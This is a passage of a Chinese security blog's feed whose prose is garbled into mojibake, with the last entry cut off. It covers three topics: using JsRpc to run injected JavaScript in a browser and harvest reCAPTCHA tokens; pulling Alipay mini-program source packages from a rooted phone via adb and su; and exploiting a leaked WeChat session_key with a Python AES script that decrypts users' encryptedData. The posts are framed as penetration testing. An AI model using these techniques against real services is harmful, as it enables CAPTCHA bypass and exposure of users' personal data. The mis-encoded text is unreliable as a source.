è¿œç¨‹è°ƒç”¨0</h2><p><strong>æ¥å£ä¼ å…¥JSä»£ç è®©æµè§ˆå™¨æ‰§è¡Œ</strong></p><p>æµè§ˆå™¨å·²ç»è¿æ¥ä¸Šé€šä¿¡å è°ƒç”¨execjsæ¥å£å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    console.log(&quot;test&quot;)</span></span><br><span class="line"><span class="string">    return &quot;æ‰§è¡ŒæˆåŠŸ&quot;</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jscode&quot;</span>:jscode</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061646342.png" alt="image.png"> </p><h2 id="II-è¿œç¨‹è°ƒç”¨ï¼šæµè§ˆå™¨é¢„å…ˆæ³¨å†ŒJSæ–¹æ³•-ä¼ é€’å‡½æ•°åè°ƒç”¨"><a href="#II-è¿œç¨‹è°ƒç”¨ï¼šæµè§ˆå™¨é¢„å…ˆæ³¨å†ŒJSæ–¹æ³•-ä¼ é€’å‡½æ•°åè°ƒç”¨" class="headerlink" title="II è¿œç¨‹è°ƒç”¨ï¼šæµè§ˆå™¨é¢„å…ˆæ³¨å†ŒJSæ–¹æ³• ä¼ é€’å‡½æ•°åè°ƒç”¨"></a>II è¿œç¨‹è°ƒç”¨ï¼šæµè§ˆå™¨é¢„å…ˆæ³¨å†ŒJSæ–¹æ³• ä¼ é€’å‡½æ•°åè°ƒç”¨</h2><p><strong>è¿œç¨‹è°ƒç”¨1ï¼šæ— å‚è·å–å€¼</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// æ³¨å†Œä¸€ä¸ªæ–¹æ³• ç¬¬ä¸€ä¸ªå‚æ•°helloä¸ºæ–¹æ³•åï¼Œ</span></span><br><span class="line"><span class="comment">// ç¬¬äºŒä¸ªå‚æ•°ä¸ºå‡½æ•°ï¼Œresolveé‡Œé¢çš„å€¼æ˜¯æƒ³è¦çš„å€¼(å‘é€åˆ°æœåŠ¡å™¨çš„)</span></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hello&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve</span>) &#123;</span><br><span class="line">    <span class="comment">//è¿™æ ·æ¯æ¬¡è°ƒç”¨å°±ä¼šè¿”å›â€œå¥½å›°å•Š+éšæœºæ•´æ•°â€</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Js</span>_sjz = <span class="string">&quot;å¥½å›°å•Š&quot;</span>+<span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">1000</span>);</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="title class_">Js</span>_sjz);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼‚æ­¥çš„ä»£ç æ³¨å†Œï¼š</span></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&#x27;token&#x27;</span>, <span class="keyword">async</span> (resolve) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> token = <span class="keyword">await</span> grecaptcha.<span class="title function_">execute</span>(<span class="number">0</span>, &#123; <span class="attr">action</span>: <span class="string">&#x27;&#x27;</span> &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">token</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="title function_">resolve</span>(token);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®¿é—®æ¥å£ï¼Œè·å¾—jsç«¯çš„è¿”å›å€¼<br><a href="http://localhost:12080/go?group=zzz&name=hlg&action=hello">http://localhost:12080/go?group=zzz&amp;name=hlg&amp;action=hello</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061647609.png" alt="image.png"> </p><p><strong>è¿œç¨‹è°ƒç”¨2ï¼šå¸¦å‚æ•°å€¼è·å–</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å†™ä¸€ä¸ªä¼ å…¥å­—ç¬¦ä¸²ï¼Œè¿”å›base64å€¼çš„æ¥å£(è°ƒç”¨å†…ç½®å‡½æ•°btoa)</span></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hello2&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>) &#123;</span><br><span class="line">    <span class="comment">//è¿™æ ·æ·»åŠ äº†ä¸€ä¸ªparamå‚æ•°ï¼Œhttpæ¥å£å¸¦ä¸Šå®ƒï¼Œè¿™é‡Œå°±èƒ½è·å¾—</span></span><br><span class="line">    <span class="keyword">var</span> base666 = <span class="title function_">btoa</span>(param)</span><br><span class="line">    <span class="title function_">resolve</span>(base666);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è®¿é—®æ¥å£ï¼Œè·å¾—JSçš„è¿”å›å€¼ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061707111.png" alt="image-20240506170759046"> </p><h2 id="è¿œç¨‹è°ƒç”¨3ï¼šå¸¦å¤šä¸ªå‚è·-å¹¶ä¸”ä½¿ç”¨postæ–¹å¼-å–å€¼"><a href="#è¿œç¨‹è°ƒç”¨3ï¼šå¸¦å¤šä¸ªå‚è·-å¹¶ä¸”ä½¿ç”¨postæ–¹å¼-å–å€¼" class="headerlink" title="è¿œç¨‹è°ƒç”¨3ï¼šå¸¦å¤šä¸ªå‚è· å¹¶ä¸”ä½¿ç”¨postæ–¹å¼ å–å€¼"></a>è¿œç¨‹è°ƒç”¨3ï¼šå¸¦å¤šä¸ªå‚è· å¹¶ä¸”ä½¿ç”¨postæ–¹å¼ å–å€¼</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å‡è®¾æœ‰ä¸€ä¸ªå‡½æ•° éœ€è¦ä¼ é€’ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hlg</span>(<span class="params">User,Status</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">User</span>+<span class="string">&quot;è¯´ï¼š&quot;</span>+<span class="title class_">Status</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hello3&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>) &#123;</span><br><span class="line">    <span class="comment">//è¿™é‡Œè¿˜æ˜¯paramå‚æ•° paramé‡Œé¢çš„key æ˜¯å…ˆè¿™é‡Œå†™ï¼Œä½†åˆ°æ—¶å€™ä¼ æ¥å£å°±å¿…é¡»å¯¹åº”çš„ä¸Š</span></span><br><span class="line">    res=<span class="title function_">hlg</span>(param[<span class="string">&quot;user&quot;</span>],param[<span class="string">&quot;status&quot;</span>])</span><br><span class="line">    <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è®¿é—®æ¥å£ï¼Œè·å¾—jsç«¯çš„è¿”å›å€¼</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hello3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;param&quot;</span>: json.dumps(&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;é»‘è„¸æ€ª&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;å¥½å›°å•Š&quot;</span>&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;param&quot;</span>]) <span class="comment">#dumpsåå°±æ˜¯é•¿è¿™æ ·çš„å­—ç¬¦ä¸²&#123;&quot;user&quot;: &quot;\u9ed1\u8138\u602a&quot;, &quot;status&quot;: &quot;\u597d\u56f0\u554a&quot;&#125;</span></span><br><span class="line">res=requests.post(url, data=data) <span class="comment">#è¿™é‡Œæ¢getä¹Ÿæ˜¯å¯ä»¥çš„</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061710235.png" alt="image-20240506171012173"> </p>]]></content>
      
      
      <categories>
          
          <category> JSé€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JsRpc </tag>
            
            <tag> åŠ è§£å¯† </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ”¯ä»˜å®å°ç¨‹åºåç¼–è¯‘æµç¨‹</title>
      <link href="/2024/05/04/%E6%94%AF%E4%BB%98%E5%AE%9D%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/05/04/%E6%94%AF%E4%BB%98%E5%AE%9D%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨å¹³å¸¸æµ‹è¯•å¾®ä¿¡å°ç¨‹åºçš„æ—¶å€™ï¼Œä¼šå¯¹å¾®ä¿¡å°ç¨‹åºè¿›è¡Œä¸€ä¸‹åç¼–è¯‘ï¼Œçœ‹çœ‹é‡Œé¢æœ‰æ²¡æœ‰æ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å°ç¨‹åºçš„keyã€secretã€æ•æ„Ÿæ¥å£ï¼Œç¡¬ç¼–ç ç­‰ã€‚é’ˆå¯¹ä¸€äº›é‡‘èç±»çš„å°ç¨‹åºï¼Œå¯èƒ½è¿˜è¦å¯¹å…¶åç¼–è¯‘åè·å–æºç ï¼Œå®šä½åŠ è§£å¯†ç®—æ³•ï¼Œé…ç€è„šæœ¬å®ç°æ¸—é€æµ‹è¯•ã€‚è¿™å—ç›¸å…³çš„çŸ¥è¯†ï¼Œç½‘ä¸Šæœ‰æ¯”è¾ƒå¤šçš„æ¡ˆä¾‹ï¼Œå°±ä¸ç»†è¯´äº†ã€‚</p><p>å‰æ®µæ—¶é—´æŸè¿è¥å•†ï¼Œæå‡ºé’ˆå¯¹æ”¯ä»˜å®ä¸­å°ç¨‹åºçš„æ¸—é€æµ‹è¯•ï¼Œå°±åœ¨æƒ³èƒ½ä¸èƒ½æŠŠæ”¯ä»˜å®ä¸­å°ç¨‹åºåƒå¾®ä¿¡ä¸€æ ·åç¼–è¯‘ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ç½‘ä¸Šæ‰¾äº†ä¸€åœˆï¼Œå…³äºæ”¯ä»˜å®å°ç¨‹åºåç¼–è¯‘æ¡ˆä¾‹è¾ƒå°‘ï¼Œå‚è€ƒäº†ç½‘ä¸Šä¸€äº›æ•™ç¨‹ï¼Œç®€å•è®°å½•ä¸€ä¸‹æ”¯ä»˜å®å°ç¨‹åºåç¼–è¯‘çš„è¿‡ç¨‹ã€‚ã€‚ã€‚</p><h1 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h1><ul><li>å·²ç»rootè¿‡çš„æ‰‹æœºï¼ˆè¿™å—æ¨¡æ‹Ÿå™¨ä¹Ÿè¡Œ-æ¨¡æ‹Ÿå™¨é»˜è®¤æ”¯æŒæ”¯ä»˜å®ï¼‰</li><li>å®‰å“adbï¼ˆå®‰è£…å®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ Platform Tools-åŒ…å« ADBï¼‰</li></ul><h1 id="å®šä½æºç åŒ…ä½ç½®"><a href="#å®šä½æºç åŒ…ä½ç½®" class="headerlink" title="å®šä½æºç åŒ…ä½ç½®"></a>å®šä½æºç åŒ…ä½ç½®</h1><p>1ã€è¿ä¸Šæ‰‹æœºä»¥åWindowsè¿›å…¥adb shellç„¶åsuåˆ‡æ¢ä¸ºç®¡ç†å‘˜æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell &amp;&amp; su</span><br></pre></td></tr></table></figure><p>2ã€ç„¶åç›´æ¥è¿›å…¥æ”¯ä»˜å®å°ç¨‹åºå­˜æ”¾ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data/data/com.eg.android.AlipayGphone/files/nebulaInstallApps/</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œå°±å¯ä»¥çœ‹åˆ°è¯¥ç›®å½•ä¸‹ï¼Œå¯¹åº”çš„å°ç¨‹åºåˆ—è¡¨</p><p>å¯ä»¥æŒ‰ç…§æ—¶é—´æ’åºï¼ŒæŸ¥çœ‹æœ€æ–°æ‰“å¼€çš„æ”¯ä»˜å®å°ç¨‹åº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503090.png" alt="image.png"> </p><p>æ’åœ¨æœ€ä¸Šé¢çš„å°±æ˜¯æœ€è¿‘æ‰“å¼€çš„å°ç¨‹åºï¼Œä»ä¸Šå¾€ä¸‹æŒ‰æ—¶é—´é™åºï¼Œä¸€èˆ¬éƒ½æ˜¯å›¾ä¸­ä¸€é•¿ä¸²æ•°å­—çš„.</p><p>ã€*ã€‘6å¼€å¤´çŸ­æ•°å­—çš„ç›®å½•æˆ‘çœ‹çš„æ˜¯æ”¯ä»˜å®åŠ è½½çš„æœåŠ¡åŒ…ã€‚</p><p>3ã€ç„¶åéšä¾¿è¿›å…¥ä¸€ä¸ªå°ç¨‹åºç›®å½•æŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd 6d478a9eea58c23d3de0a047a9534d70</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503700.png" alt="img"> </p><p>è¿™ä¸ªtaræ–‡ä»¶å°±æ˜¯å°ç¨‹åºçš„æºç åŒ…ï¼Œç„¶åè®©è¿™ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°sdcardç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp 2021004100610928.tar /sdcard/</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥adb pullå°†æºç åŒ…å¯¼å‡ºæ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb pull /sdcard/2021004100610928.tar</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºåç›´æ¥è§£å‹æ–‡ä»¶å°±å¯ä»¥æŸ¥çœ‹æºç äº†</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503317.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061505475.png" alt="image.png">  </p><p>æœ€ç»ˆå¯¼å‡ºæ¥ä¹‹åæ•ˆæœå›¾å¦‚ä¸‹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061503347.png" alt="img"> </p><p>3ã€å°ç¨‹åºæºç ä½¿ç”¨çš„æ˜¯jsï¼Œè€Œé€šå¸¸ä¼šåŠ å¯†ã€æ··æ·†ç­‰ï¼Œå¦‚ä¸Šå›¾çš„jsæ–‡ä»¶ï¼Œå¯¹äºæˆ‘ä»¬åˆ†æä¼šæœ‰ä¸€å®šçš„é˜»ç¢ã€‚</p><p>æ–¹æ³•è¿˜æ˜¯æœ‰çš„ï¼Œåªéœ€è¦å¯¹jsè¿›è¡Œç¾åŒ–å³å¯å¸®åŠ©æˆ‘ä»¬åˆ†æï¼Œè¿™é‡Œæ¨èä¸€ä¸ªjsç¾åŒ–åœ¨çº¿å·¥å…·ï¼š</p><p><a href="https://tool.lu/js/">https://tool.lu/js/</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061504971.png" alt="image.png">  </p><h1 id="ç»“å°¾"><a href="#ç»“å°¾" class="headerlink" title="ç»“å°¾"></a>ç»“å°¾</h1><p>æ”¯ä»˜å®ä¸‹ç¨‹åºæºç åŒ…è·å–è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚ä¸éœ€è¦åƒå¾®ä¿¡å°ç¨‹åºé‚£æ ·è§£å¯†ï¼Œåç¼–è¯‘ä¹‹ç±»çš„ã€‚</p><p>tarå‹ç¼©æ–‡ä»¶å³ä¸ºå°ç¨‹åºçš„æºç åŒ…ã€‚è¿™ä¸ªåŒ…æ²¡æœ‰åŠ å¯†ï¼Œä½¿ç”¨adb pullæ‹¿å‡ºæ¥ï¼Œç›´æ¥è§£å‹å³å¯ã€‚è§£å‹åå¯¹jsæ ¼å¼åŒ–ä¸‹ä»£ç ï¼Œå°±å¯ä»¥åˆ†æäº†ã€‚jsä»£ç æ²¡æœ‰æ··æ·†ï¼Œæ¡ç†å¾ˆæ¸…æ™°</p><h1 id="å¤‡æ³¨-æ”¯ä»˜å®å°ç¨‹åºæŠ“åŒ…"><a href="#å¤‡æ³¨-æ”¯ä»˜å®å°ç¨‹åºæŠ“åŒ…" class="headerlink" title="[å¤‡æ³¨]æ”¯ä»˜å®å°ç¨‹åºæŠ“åŒ…"></a>[å¤‡æ³¨]<strong>æ”¯ä»˜å®å°ç¨‹åºæŠ“åŒ…</strong></h1><p>åœ¨æŸ¥æ‰¾å°ç¨‹åºåç¼–è¯‘çš„æ—¶å€™ï¼Œçœ‹åˆ°52pojieä¸€ç¯‡å…³äºå°ç¨‹åºæŠ“åŒ…çš„æ–‡ç« ï¼Œå¯ä»¥å‚è€ƒä¸‹ï¼</p><p><a href="https://www.52pojie.cn/thread-1050690-1-1.html">https://www.52pojie.cn/thread-1050690-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> å°ç¨‹åº </tag>
            
            <tag> æ”¯ä»˜å® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç¨‹åºsessionkeyæ³„éœ²æ¼æ´åˆ©ç”¨</title>
      <link href="/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8Fsessionkey%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8Fsessionkey%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="æ¡ˆä¾‹ä»‹ç»"><a href="#æ¡ˆä¾‹ä»‹ç»" class="headerlink" title="æ¡ˆä¾‹ä»‹ç»"></a>æ¡ˆä¾‹ä»‹ç»</h1><p>é—²æ¥æ— äº‹ï¼Œåœ¨æµ‹è¯•æŸå°ç¨‹åºçš„æ—¶å€™ï¼Œå‘ç°å­˜åœ¨sessionkeyæ³„éœ²æ¼æ´ã€‚å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p><p>1ã€æ‰“å¼€å°ç¨‹åºåï¼Œç‚¹å‡»ã€ç”¨æˆ·ä¸€é”®ç™»å½•ã€‘ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061407311.png" alt="image.png"> </p><p>2ã€burpæŠ“åŒ…ï¼Œå‘ç°åœ¨è¯·æ±‚å‚æ•°ä¸­æºå¸¦äº†å‡ ä¸ªæ¯”è¾ƒæ•æ„Ÿçš„å­—æ®µï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061407019.png" alt="image.png"> </p><p>ä¸‰ä¸ªæ•æ„Ÿå‚æ•°</p><ul><li>encryptedData</li><li>iv</li><li>session_key</li></ul><p>3ã€å‚è€ƒä¸Šç¯‡æ–‡ç« ï¼Œå¾®ä¿¡å°ç¨‹åºç™»å½•æµç¨‹ã€‚çŸ¥é“session_keyçš„ä½œç”¨ä¹‹ä¸€æ˜¯å°†å°ç¨‹åºå‰ç«¯ä»å¾®ä¿¡æœåŠ¡å™¨è·å–åˆ°çš„encryptedData è§£å¯†å‡ºæ¥ã€‚</p><h1 id="æœåŠ¡ç«¯è·å–å¼€æ”¾æ•°æ®"><a href="#æœåŠ¡ç«¯è·å–å¼€æ”¾æ•°æ®" class="headerlink" title="æœåŠ¡ç«¯è·å–å¼€æ”¾æ•°æ®"></a>æœåŠ¡ç«¯è·å–å¼€æ”¾æ•°æ®</h1><p>å¾®ä¿¡ä¼šå¯¹å¼€æ”¾æ•°æ®åšç­¾åå’ŒåŠ å¯†å¤„ç†ã€‚å¼€å‘è€…åå°æ‹¿åˆ°å¼€æ”¾æ•°æ®åå¯ä»¥å¯¹æ•°æ®è¿›è¡Œæ ¡éªŒç­¾åå’Œè§£å¯†ï¼Œæ¥ä¿è¯æ•°æ®ä¸è¢«ç¯¡æ”¹ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061416344.png" alt="image-20240506141657312"> </p><p>ç­¾åæ ¡éªŒä»¥åŠæ•°æ®åŠ è§£å¯†æ¶‰åŠç”¨æˆ·çš„ä¼šè¯å¯†é’¥ session_keyã€‚ å¼€å‘è€…åº”è¯¥äº‹å…ˆé€šè¿‡ <a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/login/wx.login.html">wx.login</a> ç™»å½•æµç¨‹è·å–ä¼šè¯å¯†é’¥ session_key å¹¶ä¿å­˜åœ¨æœåŠ¡å™¨ã€‚ä¸ºäº†æ•°æ®ä¸è¢«ç¯¡æ”¹ï¼Œå¼€å‘è€…ä¸åº”è¯¥æŠŠ session_key ä¼ åˆ°å°ç¨‹åºå®¢æˆ·ç«¯ç­‰æœåŠ¡å™¨å¤–çš„ç¯å¢ƒã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061417692.png" alt="image.png"> </p><h1 id="åŠ å¯†æ•°æ®è§£å¯†ç®—æ³•"><a href="#åŠ å¯†æ•°æ®è§£å¯†ç®—æ³•" class="headerlink" title="åŠ å¯†æ•°æ®è§£å¯†ç®—æ³•"></a>åŠ å¯†æ•°æ®è§£å¯†ç®—æ³•</h1><p>æ¥å£å¦‚æœæ¶‰åŠæ•æ„Ÿæ•°æ®ï¼ˆå¦‚<a href="https://developers.weixin.qq.com/miniprogram/dev/api/open-api/user-info/wx.getUserInfo.html">wx.getUserInfo</a>å½“ä¸­çš„ openId å’Œ unionIdï¼‰ï¼Œæ¥å£çš„æ˜æ–‡å†…å®¹å°†ä¸åŒ…å«è¿™äº›æ•æ„Ÿæ•°æ®ã€‚å¼€å‘è€…å¦‚éœ€è¦è·å–æ•æ„Ÿæ•°æ®ï¼Œéœ€è¦å¯¹æ¥å£è¿”å›çš„åŠ å¯†æ•°æ®(encryptedData) è¿›è¡Œå¯¹ç§°è§£å¯†ã€‚ è§£å¯†ç®—æ³•å¦‚ä¸‹ï¼š</p><ol><li>å¯¹ç§°è§£å¯†ä½¿ç”¨çš„ç®—æ³•ä¸º AES-128-CBCï¼Œæ•°æ®é‡‡ç”¨PKCS#7å¡«å……ã€‚</li><li>å¯¹ç§°è§£å¯†çš„ç›®æ ‡å¯†æ–‡ä¸º Base64_Decode(encryptedData)ã€‚</li><li>å¯¹ç§°è§£å¯†ç§˜é’¥ aeskey &#x3D; Base64_Decode(session_key), aeskey æ˜¯16å­—èŠ‚ã€‚</li><li>å¯¹ç§°è§£å¯†ç®—æ³•åˆå§‹å‘é‡ ä¸ºBase64_Decode(iv)ï¼Œå…¶ä¸­ivç”±æ•°æ®æ¥å£è¿”å›ã€‚</li></ol><p>å¾®ä¿¡å®˜æ–¹æä¾›äº†å¤šç§ç¼–ç¨‹è¯­è¨€çš„ç¤ºä¾‹ä»£ç ï¼ˆ<a href="https://res.wx.qq.com/wxdoc/dist/assets/media/aes-sample.eae1f364.zip">ç‚¹å‡»ä¸‹è½½</a>ï¼‰ã€‚æ¯ç§è¯­è¨€ç±»å‹çš„æ¥å£åå­—å‡ä¸€è‡´ã€‚</p><h1 id="Pythonæœ¬åœ°å®ç°"><a href="#Pythonæœ¬åœ°å®ç°" class="headerlink" title="Pythonæœ¬åœ°å®ç°"></a>Pythonæœ¬åœ°å®ç°</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2024-04-26 15:42</span></span><br><span class="line"><span class="comment"># @Author: muhe Jing</span></span><br><span class="line"><span class="comment"># @File: decrypt.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key, i_v</span>):</span><br><span class="line">    data = base64.b64decode(urllib.parse.unquote(data))</span><br><span class="line">    key = base64.b64decode(urllib.parse.unquote(key))</span><br><span class="line">    i_v = base64.b64decode(urllib.parse.unquote(i_v))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    <span class="built_in">print</span>(i_v)</span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, i_v)</span><br><span class="line">    decrypted = cipher.decrypt(data)</span><br><span class="line">    <span class="built_in">print</span>(decrypted.decode)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encryptedData = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥è·å–åˆ°çš„encryptedData:&quot;</span>)</span><br><span class="line">    session_key = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥è·å–åˆ°çš„session_key:&quot;</span>)</span><br><span class="line">    iv = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥è·å–åˆ°çš„iv:&quot;</span>)</span><br><span class="line">    decrypt(encryptedData, session_key, iv)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061418857.png" alt="img"> </p><p>è¿™å—å¯ä»¥çœ‹åˆ°è§£å¯†ä¹‹åï¼Œåœ¨æ˜æ–‡å­—ç¬¦ä¸²åé¢æœ‰ç‰¹æ®Šå­—ç¬¦ â€œ\0eâ€</p><p>è¿™ä¸»è¦æ˜¯å› ä¸ºAESç®—æ³•å¡«å……ä½¿ç”¨çš„æ˜¯PKCS#7ï¼Œè¯¥å¡«å……æ¨¡å¼çš„ç‰¹æ€§å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405061423475.png" alt="image-20240506142355445"> </p><p>æ‰€ä»¥ï¼Œè¿™å—å¡«å……ä¸ªäº† 14å­—èŠ‚çš„ â€œ\x0eâ€ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> å¾®ä¿¡å°ç¨‹åº </tag>
            
            <tag> sessionkeyæ³„éœ² </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç¨‹åºæˆæƒ&amp;ç™»å½•&amp;sessionkey&amp;unionidä»‹ç»</title>
      <link href="/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%88%E6%9D%83-%E7%99%BB%E5%BD%95-sessionkey-unionid%E4%BB%8B%E7%BB%8D/"/>
      <url>/2024/05/04/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8E%88%E6%9D%83-%E7%99%BB%E5%BD%95-sessionkey-unionid%E4%BB%8B%E7%BB%8D/</url>
      
